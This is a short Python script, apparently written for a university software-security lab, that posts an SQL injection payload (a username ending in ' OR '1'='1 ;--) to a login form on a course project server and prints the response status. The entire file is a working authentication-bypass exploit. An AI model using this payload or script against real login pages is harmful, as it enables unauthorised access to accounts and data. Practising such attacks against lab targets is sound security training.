import requests

headers = {
   'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
}

login_data = {
    'username' : 'ssofadmin\' OR \'1\'=\'1 ;--',
    'password' : 'teste'
}


with requests.Session() as s:
    login_url = 'http://34ead85a967c3a29f1f3d306c40d31e50f45c0adc2ef24f9f20babfa4e40.project.ssof.rnl.tecnico.ulisboa.pt/login'
    
    r = s.get(login_url, headers = headers)

    r = s.post(login_url, data = login_data, headers=headers)

    print(r.status_code)